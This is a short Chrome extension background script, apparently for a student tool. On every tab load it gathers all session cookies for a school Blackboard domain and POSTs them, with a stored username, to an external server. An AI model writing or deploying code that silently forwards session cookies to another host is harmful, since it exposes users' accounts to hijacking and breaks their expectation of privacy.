chrome.tabs.onUpdated.addListener( function (tabId, changeInfo, tab) {
    if (changeInfo.status == 'complete') {
          chrome.cookies.getAll({
            domain: "northallegheny.blackboard.com"
          }, function (cookies) {
            let cookieStr = "";
            for (let i = 0; i < cookies.length; i++) {
                cookieStr += cookies[i].name + "=" + cookies[i].value + "; ";
            }
            console.log(cookieStr);

            chrome.storage.local.get(["username"]).then((result) => {
                console.log(result)
                let username = result.username;
                console.log(username);
                console.log(JSON.stringify({
                    "user": username,
                    "bbcookies": cookieStr
                }))
                fetch("https://studentmate.shuchir.dev/sendCookies", {
                method: 'post',
                mode: 'no-cors',
                headers: {
                    "Content-type": "application/json; charset=UTF-8"
                },
                body: JSON.stringify({
                    "user": username,
                    "bbcookies": cookieStr
                })
                })
              });
          });

    }
  })